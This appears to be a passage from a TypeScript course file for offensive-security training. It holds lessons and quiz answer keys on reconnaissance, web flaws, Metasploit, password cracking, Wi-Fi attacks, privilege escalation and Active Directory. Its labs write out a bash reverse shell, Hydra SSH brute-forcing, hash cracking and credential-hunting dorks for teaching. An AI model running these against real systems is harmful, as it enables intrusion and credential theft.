import { Tier } from '../../types';

export const tier3: Tier = {
  id: 'tier-3',
  number: 3,
  title: 'Offensive Security',
  description: 'Master penetration testing methodologies, OSINT, network exploitation, web application security vulnerabilities, privilege escalation, and Active Directory exploitation.',
  topics: [
    {
      id: 'recon-scanning',
      title: 'Ethical Hacking & Reconnaissance',
      category: 'offense',
      lessons: [
        {
          id: 'pentest-method',
          title: 'Penetration Testing Methodologies',
          description: 'Explore the phases of ethical hacking, legal Scopes of Work, and reporting standards.',
          duration: '15 mins',
          content: `### Penetration Testing Methodologies

**Difficulty:** Beginner  
**Estimated Study Time:** 15 Minutes  
**Prerequisites:** None  

#### Learning Objectives
- Map the operational stages of a penetration test.
- Structure a formal Rules of Engagement (RoE) document.
- Write executive and technical vulnerability reports.

#### Key Concepts
- **Rules of Engagement (RoE):** A binding legal contract detailing boundaries, authorized IP targets, scanning schedules, and critical contacts for a pentest.
- **PTES (Penetration Testing Execution Standard):** A structured pentesting methodology containing seven phases from pre-engagement to reporting.
- **Scope of Work (SoW):** Defines the exact network blocks, servers, and applications authorized for security testing.

#### Detailed Lesson Content
Ethical hacking requires strict adherence to legal frameworks. **Rules of Engagement (RoE)** ensure that security assessments are conducted safely and legally, protecting both the client\'s operations and the tester. Penetration testing follows structured phases: Pre-engagement, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post-Exploitation, and **Reporting**. The report is the tester\'s primary deliverable, detailing vulnerability findings, risk severities, and actionable remediation steps.`,
          quiz: [
            {
              id: 'q-eth-1',
              question: 'Which legal document defines the authorized IP ranges, testing hours, and communication paths for a pentest?',
              options: [
                'Rules of Engagement (RoE)',
                'Master Service Agreement (MSA)',
                'Security Assessment Report',
                'Nondisclosure Agreement (NDA)'
              ],
              correctOption: 0,
              explanation: 'The Rules of Engagement (RoE) is the operational contract that outlines targets, constraints, and boundaries for a pentest.'
            },
            {
              id: 'q-eth-2',
              question: 'Which phase of the PTES framework is dedicated to analyzing collected scanning telemetry to locate open entry points?',
              options: [
                'Post-Exploitation',
                'Threat Modeling',
                'Vulnerability Analysis',
                'Reporting'
              ],
              correctOption: 2,
              explanation: 'Vulnerability Analysis is the process of correlating scanning and enumeration results to identify exploitable vulnerabilities.'
            },
            {
              id: 'q-eth-3',
              question: 'Who is the primary audience for the Executive Summary section of a penetration testing report?',
              options: [
                'Security Engineers',
                'Database Administrators',
                'Corporate Executives & Non-Technical Management',
                'System Auditors'
              ],
              correctOption: 2,
              explanation: 'The Executive Summary uses non-technical business language to describe the test\'s scope, high-level findings, and overall security posture.'
            },
            {
              id: 'q-eth-4',
              question: 'What is the risk of scanning or testing IP addresses not explicitly listed in a pentest\'s Scope of Work?',
              options: [
                'The scan results will be incomplete.',
                'It is illegal and can lead to criminal charges or civil lawsuits.',
                'It automatically disables host firewalls.',
                'It causes routers to crash.'
              ],
              correctOption: 1,
              explanation: 'Accessing systems outside the authorized scope is illegal (violating laws like the Computer Fraud and Abuse Act), even during an active engagement.'
            }
          ]
        },
        {
          id: 'osint-passive',
          title: 'Open Source Intelligence & Passive Recon',
          description: 'Leverage Google Dorking, domain records, and public threat directories like Shodan to gather intelligence.',
          duration: '18 mins',
          content: `### Open Source Intelligence & Passive Recon

**Difficulty:** Beginner  
**Estimated Study Time:** 18 Minutes  
**Prerequisites:** Penetration Testing Methodologies  

#### Learning Objectives
- Conduct passive footprinting of domain targets.
- Leverage Google Dorking parameters to locate exposed documents and configuration files.
- Query Shodan and Censys to find exposed services without interacting with the target.

#### Key Concepts
- **Passive Reconnaissance:** Gathering intelligence without interacting with the target system directly.
- **Google Dorking:** Using advanced search operators to find sensitive, indexed files.
- **Shodan:** A search engine for internet-connected devices, detailing active ports and banners globally.
- **Whois:** Database query protocol used to retrieve registration and ownership details for domains.

#### Hands-On Lab: Google Dorking Queries
Use advanced Google search parameters to find exposed documents:
\`\`\`text
# Locate exposed PDF documents on a target domain
site:example.com filetype:pdf

# Search for publicly accessible log files containing passwords
filetype:log "password" "username"
\`\`\`

#### Detailed Lesson Content
Reconnaissance is the foundation of exploitation. **Passive Reconnaissance** allows you to map a target's infrastructure without triggering detection systems, utilizing public records and search engines.
- **Google Dorking** leverages search operators (like \`filetype:\` and \`intitle:\`) to find exposed credentials, logs, and database files.
- **Shodan** and **Censys** query global internet-connected systems, allowing you to discover listening ports and software versions on your target\'s external servers without sending a single packet to their network.`,
          quiz: [
            {
              id: 'q-os-1',
              question: 'Which of the following describes passive reconnaissance?',
              options: [
                'Sending vulnerability payloads directly to a server.',
                'Gathering intelligence about a target using public records and third-party directories without interacting with the systems directly.',
                'Running an active Nmap scan against a network block.',
                'Attempting to brute force an SSH portal.'
              ],
              correctOption: 1,
              explanation: 'Passive recon gathers publicly available details (DNS records, public directories, cached files) to avoid triggering security alerts on the target systems.'
            },
            {
              id: 'q-os-2',
              question: 'Which Google Dorking operator limits search results to a specific website domain?',
              options: [
                'domain:',
                'site:',
                'url:',
                'filetype:'
              ],
              correctOption: 1,
              explanation: 'The "site:" operator limits Google search results to the specified domain or top-level domain.'
            },
            {
              id: 'q-os-3',
              question: 'What is the primary function of Shodan?',
              options: [
                'To register new domains securely.',
                'To search for internet-connected IoT devices, servers, and routers, exposing open ports and service banners.',
                'To run brute force password attacks against web forms.',
                'To compile python code.'
              ],
              correctOption: 1,
              explanation: 'Shodan continuously scans the internet, indexing active ports and service banners for connected devices globally.'
            },
            {
              id: 'q-os-4',
              question: 'Which tool gathers passive subdomain and email data from public threat resources?',
              options: [
                'Hydra',
                'theHarvester',
                'Nmap',
                'John the Ripper'
              ],
              correctOption: 1,
              explanation: 'theHarvester collects emails, subdomains, hosts, employee names, and open ports from public search engines and PGP key servers.'
            }
          ]
        },
        {
          id: 'active-recon',
          title: 'Active Reconnaissance & Port Scanning',
          description: 'Probe targets using stealth Nmap scans, enumerate protocols, and map target systems.',
          duration: '18 mins',
          content: `### Active Reconnaissance & Port Scanning

**Difficulty:** Medium  
**Estimated Study Time:** 18 Minutes  
**Prerequisites:** Open Source Intelligence & Passive Recon  

#### Learning Objectives
- Configure stealth port scans using advanced Nmap flags.
- Use Nmap Scripting Engine (NSE) scripts to check for vulnerabilities.
- Enumerate common ports and services (SMB, FTP, SNMP, LDAP).

#### Key Concepts
- **Active Reconnaissance:** Directly interacting with target systems to map ports and services.
- **Nmap (Network Mapper):** Open-source tool used for network discovery and security auditing.
- **NSE (Nmap Scripting Engine):** Scripts written in Lua to automate vulnerability scanning and protocol check tasks.
- **SMB Enumeration:** Querying Server Message Block (Port 445) services to locate open file shares.

#### Hands-On Lab: Active Nmap Auditing
Scan targets and identify open services using Nmap:
\`\`\`bash
# Run a silent stealth SYN scan against a target IP, identifying services
sudo nmap -sS -sV -O -T4 10.10.10.5

# Run a secure vulnerability script against target web ports
nmap --script vuln -p 80,443 10.10.10.5
\`\`\`

#### Detailed Lesson Content
Unlike passive recon, **Active Reconnaissance** interacts directly with target systems. This provides accurate information but is highly visible to security monitoring systems.
Using **Nmap**, testers perform port scanning to identify listening services. A **SYN Scan (\`-sS\` - Stealth Scan)** breaks the TCP 3-way handshake process: it sends a SYN packet and immediately resets the connection (RST) upon receiving a SYN/ACK, avoiding establishing a full session and evading simple loggers. Once ports are found, custom enumeration tools are used to query specific protocols (such as auditing open file shares on **SMB Port 445** or user lists on **SNMP Port 161**).`,
          quiz: [
            {
              id: 'q-as-1',
              question: 'Why does an Nmap SYN Scan (-sS) avoid establishing a full connection with the target system?',
              options: [
                'It uses encrypted UDP packets.',
                'It sends a RST packet after receiving a SYN/ACK, breaking the 3-way handshake before a session is logged.',
                'It routes traffic through a VPN.',
                'It scans ports in reverse order.'
              ],
              correctOption: 1,
              explanation: 'The SYN scan breaks the TCP handshake by sending a RST (reset) packet instead of an ACK, preventing traditional applications from logging a connection.'
            },
            {
              id: 'q-as-2',
              question: 'Which Nmap flag is used to discover active software versions running on open ports?',
              options: [
                '-sS',
                '-sV',
                '-O',
                '-sn'
              ],
              correctOption: 1,
              explanation: 'The "-sV" flag probes open ports to determine service and version details (e.g., identifying Apache version 2.4.41).'
            },
            {
              id: 'q-as-3',
              question: 'Which port handles SMB (Server Message Block) traffic, which is commonly audited for open file shares and vulnerabilities?',
              options: [
                'Port 21',
                'Port 80',
                'Port 445',
                'Port 3389'
              ],
              correctOption: 2,
              explanation: 'SMB runs on TCP Port 445, serving as a primary target for sharing files and printer resources across Windows networks.'
            },
            {
              id: 'q-as-4',
              question: 'In what language are Nmap Scripting Engine (NSE) scripts written?',
              options: [
                'Python',
                'Lua',
                'Bash',
                'C++'
              ],
              correctOption: 1,
              explanation: 'NSE scripts are written in the Lua programming language, enabling fast, lightweight automation for network audits.'
            }
          ]
        }
      ]
    },
    {
      id: 'web-security',
      title: 'Web Application Security',
      category: 'offense',
      lessons: [
        {
          id: 'web-owasp-top-10',
          title: 'Web Technologies & OWASP Top 10',
          description: 'Analyse HTTP layers, and exploit critical web application flaws like SQL Injection, XSS, and SSRF.',
          duration: '22 mins',
          content: `### Web Technologies & OWASP Top 10

**Difficulty:** Hard  
**Estimated Study Time:** 22 Minutes  
**Prerequisites:** Active Reconnaissance & Port Scanning  

#### Learning Objectives
- Analyze HTTP request and response structures.
- Exploit SQL Injection (SQLi) and Cross-Site Scripting (XSS).
- Exploit Server-Side Request Forgery (SSRF).
- Implement secure parameterized code models.

#### Key Concepts
- **SQL Injection (SQLi):** Executing malicious SQL statements through user input parameters.
- **Cross-Site Scripting (XSS):** Injecting malicious scripts into web pages viewed by other users.
- **SSRF (Server-Side Request Forgery):** Vulnerability allowing attackers to force a server-side application to send requests to arbitrary locations (often targeting internal metadata endpoints).
- **JWT (JSON Web Token):** Standard format for securely transmitting session data as JSON objects.

#### Detailed Lesson Content
Web applications are highly targeted entry points. Web security requires understanding the stateless **HTTP/S** protocols, session cookies, and modern API infrastructures like GraphQL and REST APIs.
- **SQL Injection (SQLi)** occurs when user inputs are concatenated directly into backend database queries (e.g., \`SELECT * FROM users WHERE user = '\` + input). This can be prevented by using **parameterized queries** (prepared statements) that treat inputs strictly as parameters, never executable SQL code.
- **Cross-Site Scripting (XSS)** allows attackers to execute malicious JavaScript in other users\' browsers. This can be prevented by sanitizing inputs and using appropriate output encoding.
- **SSRF** exploits trust relationships: attackers force the vulnerable server to query internal networks or cloud metadata directories (like \`http://169.254.169.254/latest/meta-data/\` on AWS), exposing internal services and configuration secrets.`,
          quiz: [
            {
              id: 'q-web-1',
              question: 'What is the most effective way to protect web applications against SQL Injection vulnerabilities?',
              options: [
                'Filtering special characters client-side',
                'Using Parameterized Queries / Prepared Statements',
                'Implementing a Web Application Firewall (WAF)',
                'Encrypting the SQL database'
              ],
              correctOption: 1,
              explanation: 'Prepared statements separate query code from input parameters, ensuring that the SQL database driver treats inputs strictly as data, never executable commands.'
            },
            {
              id: 'q-web-2',
              question: 'Which type of XSS vulnerability occurs when malicious script payloads are saved directly to a database, executing whenever a user loads the infected page?',
              options: [
                'Reflected XSS',
                'Stored XSS',
                'DOM-based XSS',
                'Blind XSS'
              ],
              correctOption: 1,
              explanation: 'Stored XSS is a persistent vulnerability where the malicious payload is saved in database fields (like blog comments) and executes for every visitor.'
            },
            {
              id: 'q-web-3',
              question: 'Which cloud IP address is commonly targeted in Server-Side Request Forgery (SSRF) attacks to retrieve AWS or Google Cloud metadata and API keys?',
              options: [
                '127.0.0.1',
                '192.168.1.1',
                '169.254.169.254',
                '8.8.8.8'
              ],
              correctOption: 2,
              explanation: '169.254.169.254 is the standard link-local address for cloud metadata services, which can expose sensitive API keys and session tokens if accessed via SSRF.'
            },
            {
              id: 'q-web-4',
              question: 'What is a JSON Web Token (JWT) comprised of, separated by dots?',
              options: [
                'Header, Payload, Signature',
                'Issuer, Expiration, Key',
                'Session ID, User ID, Privilege',
                'Token, Timestamp, Salt'
              ],
              correctOption: 0,
              explanation: 'A JWT is divided into three Base64URL-encoded parts: the Header (identifying algorithm type), the Payload (storing session data), and the Signature (verifying token integrity).'
            }
          ]
        },
        {
          id: 'burpsuite-mastery',
          title: 'Burp Suite Mastery',
          description: 'Intercept web traffic, analyze session tokens, and automate web attacks using Burp Suite.',
          duration: '20 mins',
          content: `### Burp Suite Mastery

**Difficulty:** Hard  
**Estimated Study Time:** 20 Minutes  
**Prerequisites:** Web Technologies & OWASP Top 10  

#### Learning Objectives
- Set up Burp Suite as an intercepting HTTP proxy.
- Modify web requests and analyze server responses in real-time.
- Run automated credential and vulnerability fuzzing attacks.

#### Key Concepts
- **Proxy (Burp Proxy):** Sits between your browser and the web server, allowing you to intercept, view, and modify traffic in transit.
- **Repeater:** Tool used to modify and resend individual HTTP requests, which is essential for manual exploit testing.
- **Intruder:** Automation tool for running targeted brute-force and fuzzing attacks against web parameters.
- **Decoder:** Utility for encoding and decoding data formats (Base64, URL, Hex, MD5, SHA).

#### Detailed Lesson Content
**Burp Suite** is the standard tool for web application security assessments. Acting as an intercepting proxy, it captures all HTTP/S traffic between the client and server.
- The **Proxy** tab displays intercepted requests, allowing you to modify parameters before sending them to the server.
- **Repeater** is used for manual exploit testing, letting you adjust headers and inputs and analyze the server\'s response.
- **Intruder** automates scanning tasks, using custom payloads to run dictionary attacks, brute-force forms, and fuzz inputs to locate vulnerabilities.`,
          quiz: [
            {
              id: 'q-burp-1',
              question: 'Which Burp Suite tool is designed to resend modified individual requests, allowing manual testing of web parameters?',
              options: [
                'Proxy',
                'Repeater',
                'Intruder',
                'Comparer'
              ],
              correctOption: 1,
              explanation: 'Repeater allows testers to modify and resend individual HTTP requests, analyzing how the server responds to different payloads.'
            },
            {
              id: 'q-burp-2',
              question: 'Which Burp Suite tool automates custom fuzzing and dictionary attacks against target fields?',
              options: [
                'Proxy',
                'Decoder',
                'Intruder',
                'Sequencer'
              ],
              correctOption: 2,
              explanation: 'Intruder automates web requests, replacing specified parameters with list payloads to run brute-force and vulnerability fuzzing attacks.'
            },
            {
              id: 'q-burp-3',
              question: 'Which Burp Suite tool analyzes the randomness and entropy of session token structures?',
              options: [
                'Sequencer',
                'Decoder',
                'Comparer',
                'Extender'
              ],
              correctOption: 0,
              explanation: 'Sequencer evaluates the randomness of session IDs and CSRF tokens to determine if they are predictable and vulnerable to hijacking.'
            },
            {
              id: 'q-burp-4',
              question: 'What is the default IP address and port that Burp Proxy uses to listen for local browser traffic?',
              options: [
                '127.0.0.1:80',
                '127.0.0.1:8080',
                '192.168.1.1:8080',
                '10.10.10.1:443'
              ],
              correctOption: 1,
              explanation: 'By default, Burp Suite runs its local intercepting proxy listener on localhost IP 127.0.0.1 and Port 8080.'
            }
          ]
        }
      ]
    },
    {
      id: 'exploitation-tech',
      title: 'Exploitation Techniques',
      category: 'offense',
      lessons: [
        {
          id: 'net-infiltration',
          title: 'Network Infiltration & Metasploit',
          description: 'Leverage Netcat listeners, configure reverse shells, and deploy payloads using Metasploit.',
          duration: '18 mins',
          content: `### Network Infiltration & Metasploit

**Difficulty:** Hard  
**Estimated Study Time:** 18 Minutes  
**Prerequisites:** None  

#### Learning Objectives
- Compare Bind and Reverse shells.
- Establish remote connections using Netcat.
- Deploy exploit modules using the Metasploit Framework.

#### Key Concepts
- **Reverse Shell:** The target system initiates a connection back to the attacker\'s listening machine, bypassing inbound firewall rules.
- **Bind Shell:** The target system opens a listening port, allowing the attacker to connect directly to it (often blocked by firewalls).
- **Metasploit (msfconsole):** Open-source penetration testing platform containing exploit modules, payloads, and post-exploitation scripts.
- **Meterpreter:** Advanced Metasploit payload providing interactive, dynamic access to the victim system\'s RAM and OS controls.

#### Hands-On Lab: Netcat Shell Listeners
Configure and test local terminal shells:
\`\`\`bash
# On the attacker system, open an active shell listener
nc -lvnp 4444

# On the victim system, execute a bash reverse shell back to the listener
bash -i >& /dev/tcp/10.10.10.2/4444 0>&1
\`\`\`

#### Detailed Lesson Content
Infiltration is the phase where vulnerabilities are actively exploited. A **Reverse Shell** is standard practice: because most corporate firewalls block unsolicited inbound traffic but allow outbound connections, forcing the target system to connect back to your listener on an outbound port (like Port 443) effectively bypasses inbound filtering.
The **Metasploit Framework** simplifies exploitation, allowing testers to select an exploit module, pair it with a payload (such as **Meterpreter**), configure local and remote options, and launch the exploit to establish a command-line session on the target.`,
          quiz: [
            {
              id: 'q-msf-1',
              question: 'Why are reverse shells generally preferred over bind shells during security assessments?',
              options: [
                'They run faster.',
                'They bypass inbound firewall rules by forcing the target system to initiate an outbound connection back to the tester\'s listener.',
                'They do not require root privileges.',
                'They automatically encrypt network traffic.'
              ],
              correctOption: 1,
              explanation: 'Firewalls typically block unsolicited incoming traffic (affecting bind shells) but allow outbound traffic, making reverse shells highly effective.'
            },
            {
              id: 'q-msf-2',
              question: 'Which Metasploit payload runs entirely in the victim system\'s memory (RAM), avoiding writing files to disk and evading AV detection?',
              options: [
                'shell_reverse_tcp',
                'Meterpreter',
                'add_user',
                'generic/shell_bind_tcp'
              ],
              correctOption: 1,
              explanation: 'Meterpreter is an advanced, memory-resident payload that loads dynamically via DLL injection, evading standard file-based AV detection.'
            },
            {
              id: 'q-msf-3',
              question: 'Which Netcat flag configuration sets up a local listening port, displays verbose feedback, and disables DNS lookups?',
              options: [
                'nc -lvnp <port>',
                'nc -e sh <port>',
                'nc -zv <port>',
                'nc -w 10 <port>'
              ],
              correctOption: 0,
              explanation: 'The flags represent: Listen (-l), Verbose (-v), Numeric-only/No DNS (-n), and Port (-p).'
            },
            {
              id: 'q-msf-4',
              question: 'In Metasploit, what is the command used to select and load an exploit module into the console environment?',
              options: [
                'use <module_name>',
                'set <module_name>',
                'run <module_name>',
                'search <module_name>'
              ],
              correctOption: 0,
              explanation: 'The "use" command loads a specific exploit, auxiliary, or post-exploitation module into the active workspace.'
            }
          ]
        },
        {
          id: 'password-attacks',
          title: 'Password Auditing & Cracking',
          description: 'Crack hashes using Hashcat and John the Ripper, and run Hydra brute force campaigns.',
          duration: '18 mins',
          content: `### Password Auditing & Cracking

**Difficulty:** Medium  
**Estimated Study Time:** 18 Minutes  
**Prerequisites:** Network Infiltration & Metasploit  

#### Learning Objectives
- Identify cryptographic hash types.
- Perform dictionary and brute force cracking attacks using Hashcat and John the Ripper.
- Run online brute force attacks using Hydra.

#### Key Concepts
- **Hashing:** One-way mathematical translation of passwords into fixed-length strings (cannot be decrypted, only cracked via guessing).
- **John the Ripper (JtR):** CPU-based password cracker used for auditing system password files.
- **Hashcat:** Fast, GPU-accelerated password cracker supporting multiple rule engines.
- **Hydra:** Online password auditing tool used to run rapid brute-force attacks against protocols like SSH, FTP, and web forms.

#### Hands-On Lab: Cracking Hashes
Audit password security using command-line cracking tools:
\`\`\`bash
# Crack a file containing SHA256 hashes using a dictionary attack and JtR
john --format=Raw-SHA256 --wordlist=/path/rockyou.txt hashes.txt

# Run Hydra to audit weak passwords on an SSH server
hydra -l admin -P /path/rockyou.txt 10.10.10.5 ssh
\`\`\`

#### Detailed Lesson Content
Password auditing is critical for identifying weak credentials. **Hashing** is a one-way function: systems do not store plain text passwords, but rather their mathematical hashes. To "crack" a hash, you must compute the hash of guess words (e.g., from a wordlist like \`rockyou.txt\`) and compare them to the target hash.
- **Hashcat** utilizes graphics processors (GPUs) to compute billions of guesses per second, using rules to alter dictionary words (such as appending numbers).
- **Hydra** runs online attacks, directly sending username/password guesses to services (like SSH or FTP) to find weak credentials. Security teams must monitor and block such activities to prevent account compromise.`,
          quiz: [
            {
              id: 'q-pw-1',
              question: 'Why are hashing functions considered "one-way" mathematical operations?',
              options: [
                'They can only be executed once.',
                'They are designed to compress data, and there is no algorithm to reverse the hash back into the original plain text password.',
                'They only run on 32-bit operating systems.',
                'They require internet access.'
              ],
              correctOption: 1,
              explanation: 'Hashing is a one-way cryptographic function. Reversing it is mathematically infeasible, so cracked hashes must be found by hashing guesses and comparing the outputs.'
            },
            {
              id: 'q-pw-2',
              question: 'Which password cracking tool specializes in GPU-accelerated hash cracking using rules and masks?',
              options: [
                'Hydra',
                'Nmap',
                'Hashcat',
                'Burp Suite'
              ],
              correctOption: 2,
              explanation: 'Hashcat is highly optimized for GPU architecture, making it the standard tool for fast, offline password and hash cracking.'
            },
            {
              id: 'q-pw-3',
              question: 'Which of the following describes a "Password Spraying" attack?',
              options: [
                'Brute forcing thousands of passwords against a single user account.',
                'Testing a single common password (like "Password123!") across thousands of different user accounts to avoid account lockouts.',
                'Sniffing passwords on a local network switch.',
                'Decrypting SSH traffic.'
              ],
              correctOption: 1,
              explanation: 'Password spraying tests a few common passwords against many accounts, staying under login failure thresholds to bypass account lockout policies.'
            },
            {
              id: 'q-pw-4',
              question: 'Which Hydra flag configuration defines a list of usernames and a list of passwords to use in an attack?',
              options: [
                'hydra -L <user_list> -P <pass_list>',
                'hydra -u <user_list> -p <pass_list>',
                'hydra -list <user_list> -pass <pass_list>',
                'hydra --users --passwords'
              ],
              correctOption: 0,
              explanation: 'In Hydra, uppercase "-L" and "-P" flags specify files containing lists of usernames and passwords, whereas lowercase "-l" and "-p" specify single values.'
            }
          ]
        },
        {
          id: 'wireless-security',
          title: 'Wireless Security Vectors',
          description: 'Analyze WPA2/WPA3 handshakes, run deauthentication attacks, and audit wireless networks using Aircrack-ng.',
          duration: '15 mins',
          content: `### Wireless Security Vectors

**Difficulty:** Medium  
**Estimated Study Time:** 15 Minutes  
**Prerequisites:** Password Auditing & Cracking  

#### Learning Objectives
- Compare WPA2 and WPA3 security standards.
- Run deauthentication attacks to capture WPA 4-way handshakes.
- Crack captured handshakes using Aircrack-ng.

#### Key Concepts
- **WPA2 (Wi-Fi Protected Access II):** Standard wireless security protocol using Pre-Shared Keys (PSK) and AES encryption (vulnerable to offline dictionary attacks via handshake capture).
- **WPA3:** Modern wireless standard replacing PSK with SAE (Simultaneous Authentication of Equals) to protect against offline dictionary attacks.
- **Deauthentication Attack:** Sending spoofed frames to force a wireless client to disconnect from an Access Point, capturing the subsequent 4-way handshake when they reconnect.
- **Aircrack-ng:** Suite of tools designed for wireless network auditing, packet capturing, and handshake cracking.

#### Detailed Lesson Content
Wireless networks introduce physical perimeter risks. **WPA2-PSK** is vulnerable because the 4-way handshake used to authenticate clients can be captured over the air.
Using **airmon-ng**, testers place their wireless card into Monitor Mode to capture raw traffic. Sending spoofed deauthentication frames forces a client to disconnect; when the client reconnects, the tester captures the **WPA 4-way handshake** and uses **aircrack-ng** to run an offline dictionary attack to crack the pre-shared key, gaining unauthorized network access. WPA3 mitigates this by replacing PSK with SAE (Simultaneous Authentication of Equals), preventing offline dictionary attacks even if handshakes are intercepted.`,
          quiz: [
            {
              id: 'q-wl-1',
              question: 'Which wireless security protocol is vulnerable to offline dictionary cracking attacks if an attacker captures the initial 4-way authentication handshake?',
              options: [
                'WEP',
                'WPA2-PSK',
                'WPA3-SAE',
                'WPA Enterprise'
              ],
              correctOption: 1,
              explanation: 'WPA2-PSK handshakes can be captured and cracked offline using wordlists, as the handshake generation math relies on the static pre-shared key.'
            },
            {
              id: 'q-wl-2',
              question: 'What is the function of a Deauthentication attack in wireless penetration testing?',
              options: [
                'To permanently destroy the physical wireless router.',
                'To send spoofed frames that disconnect a client from an access point, capturing the 4-way handshake when they automatically reconnect.',
                'To decrypt all active internet traffic.',
                'To change the SSID of the wireless network.'
              ],
              correctOption: 1,
              explanation: 'Deauth attacks force target devices off the wireless ring, letting you intercept their subsequent reconnect handshake for cracking.'
            },
            {
              id: 'q-wl-3',
              question: 'Which tool in the Aircrack-ng suite is used to place a wireless network adapter into monitor mode?',
              options: [
                'airodump-ng',
                'aireplay-ng',
                'airmon-ng',
                'aircrack-ng'
              ],
              correctOption: 2,
              explanation: '"airmon-ng" manages wireless interface monitor configurations, enabling the card to capture raw over-the-air packets without joining a network.'
            },
            {
              id: 'q-wl-4',
              question: 'Which technology in WPA3 replaces WPA2\'s Pre-Shared Key (PSK) handshake, protecting against offline dictionary attacks?',
              options: [
                'TKIP',
                'Simultaneous Authentication of Equals (SAE)',
                'WEP Keys',
                'MD5 Authentication'
              ],
              correctOption: 1,
              explanation: 'SAE uses a secure handshake key exchange protocol (Dragonfly) that prevents offline cracking, protecting even weak passwords from offline dictionary attacks.'
            }
          ]
        }
      ]
    },
    {
      id: 'post-exploit-privesc',
      title: 'Post-Exploitation & Privilege Escalation',
      category: 'offense',
      lessons: [
        {
          id: 'priv-esc',
          title: 'Privilege Escalation',
          description: 'Harness misconfigured SUID binaries, kernel exploits, service paths, and DLL Hijacking to escalate to root/SYSTEM.',
          duration: '22 mins',
          content: `### Privilege Escalation

**Difficulty:** Hard  
**Estimated Study Time:** 22 Minutes  
**Prerequisites:** None  

#### Learning Objectives
- Identify privilege escalation vectors on Linux (SUID, Sudo rules, Cron).
- Locate privilege escalation paths on Windows (UAC bypasses, DLL Hijacking).
- Exploit misconfigured system permissions to escalate to root or SYSTEM.

#### Key Concepts
- **Privilege Escalation:** Elevating access privileges from a standard user account to administrative levels (root on Linux, SYSTEM on Windows).
- **SUID (Set Owner User ID):** Linux permission bit that allows users to execute a binary with the privileges of the file owner (usually root).
- **UAC (User Account Control):** Windows security feature preventing applications from executing with administrative rights without consent.
- **DLL Hijacking:** Placing a malicious DLL in a application search path so a program loads the malware instead of the legitimate library.

#### Hands-On Lab: Escalating Linux Privileges
Audit and exploit local SUID privileges in your terminal environment:
\`\`\`bash
# Locate all files with the SUID bit set belonging to root
find / -perm -4000 -user root -type f 2>/dev/null
\`\`\`

#### Detailed Lesson Content
Gaining initial access typically lands you in a low-privilege user session. To complete objectives, you must perform **Privilege Escalation**.
- **On Linux**, check for SUID binaries (executables running as the owner, often root). Misconfigured SUID binaries (listed on resources like **GTFOBins**) can be exploited to spawn a root shell. Other vectors include permissive sudo rules (\`sudo -l\`) and editable cron jobs.
- **On Windows**, check for loose service permissions, unquoted service paths, and opportunities for **DLL Hijacking** (where placing a malicious DLL in an application directory forces a privileged system service to load your malware).`,
          quiz: [
            {
              id: 'q-pe-1',
              question: 'What is the security risk of a Linux binary having the SUID (Set Owner User ID) bit set and owned by root?',
              options: [
                'It cannot be run by standard users.',
                'Any user executing the binary runs it with root privileges, which can lead to privilege escalation if the binary can write or read files.',
                'It automatically deletes itself.',
                'It disables host firewall logs.'
              ],
              correctOption: 1,
              explanation: 'SUID executes binaries with the privileges of the file owner (root). If an SUID file is vulnerable or misconfigured, attackers can exploit it to spawn a root console.'
            },
            {
              id: 'q-pe-2',
              question: 'Which of the following describes a Windows "Unquoted Service Path" vulnerability?',
              options: [
                'A service file that is missing its digital signature.',
                'An executable service path containing spaces and lacking quotation marks, allowing attackers to place a malicious executable that runs when the service boots.',
                'A service that runs with low-privilege rights.',
                'A registry path that is hidden from administrators.'
              ],
              correctOption: 1,
              explanation: 'When service paths contain spaces and are unquoted, Windows attempts to execute files matching parts of the path sequentially. Plasing a file named "Program.exe" in "C:\\" can hijack services located under "C:\\Program Files\\".'
            },
            {
              id: 'q-pe-3',
              question: 'Which online repository is the standard resource for finding methods to exploit misconfigured SUID binaries or sudo privileges on Linux?',
              options: [
                'ExploitDB',
                'GTFOBins',
                'LOLBAS',
                'GitHub'
              ],
              correctOption: 1,
              explanation: 'GTFOBins compiles methods for abusing standard Linux binaries that have SUID or sudo configurations to escalate privileges.'
            },
            {
              id: 'q-pe-4',
              question: 'What is the equivalent high-privilege administrative account on Windows systems that corresponds to "root" on Linux?',
              options: [
                'Administrator',
                'SYSTEM / NT AUTHORITY\\SYSTEM',
                'Domain User',
                'Local Group Policy'
              ],
              correctOption: 1,
              explanation: 'The SYSTEM account holds the highest local execution privileges on Windows, representing the core OS environment.'
            }
          ]
        },
        {
          id: 'ad-exploitation',
          title: 'Active Directory Exploitation',
          description: 'Leverage Kerberos attacks, run BloodHound graphs, and execute Kerberoasting/AS-REP Roasting.',
          duration: '22 mins',
          content: `### Active Directory Exploitation

**Difficulty:** Hard  
**Estimated Study Time:** 22 Minutes  
**Prerequisites:** Privilege Escalation  

#### Learning Objectives
- Enumerate Active Directory domains using BloodHound.
- Execute Kerberoasting and AS-REP Roasting attacks.
- Perform lateral movement using Pass-the-Hash (PtH) techniques.

#### Key Concepts
- **Domain Controller (DC):** The central server authenticating identity requests across a Windows domain.
- **Kerberoasting:** Attacking the Kerberos protocol to request service tickets (TGS) for service accounts, cracking the ticket hashes offline to recover service passwords.
- **AS-REP Roasting:** Targeting user accounts that do not require Kerberos preauthentication to request and crack ticket hashes offline.
- **BloodHound:** A graph-theory tool that maps AD attack paths, identifying AD relationships, group memberships, and privilege loops.

#### Detailed Lesson Content
Enterprise networks run on **Active Directory**. Attacking AD focuses on identity and trust relationships rather than simple software exploits.
- Testers use **BloodHound** to ingest domain metadata, generating graph maps that identify shortest paths to Domain Admin (e.g., finding that a user in Group A has local admin rights on Server B, where a Domain Admin is logged in).
- **Kerberoasting** is a highly effective attack: any domain user can request a Kerberos service ticket (TGS) for any service account (mapped via SPNs). These tickets are encrypted with the service account\'s password hash. Testers request these tickets, extract the hashes, and crack them offline using Hashcat to recover plain text service account passwords.`,
          quiz: [
            {
              id: 'q-ad-1',
              question: 'Which Active Directory attack involves requesting Kerberos Ticket Granting Service (TGS) tickets for service accounts and cracking their password hashes offline?',
              options: [
                'Pass-the-Hash (PtH)',
                'Kerberoasting',
                'AS-REP Roasting',
                'Golden Ticket'
              ],
              correctOption: 1,
              explanation: 'Kerberoasting requests TGS tickets for accounts with Service Principal Names (SPNs). Since these tickets are encrypted with the service account\'s password hash, they can be captured and cracked offline.'
            },
            {
              id: 'q-ad-2',
              question: 'Which tool uses graph-theory to map trust relationships, group memberships, and shortest paths to Domain Admin in Active Directory?',
              options: [
                'Nmap',
                'BloodHound',
                'Mimikatz',
                'Wireshark'
              ],
              correctOption: 1,
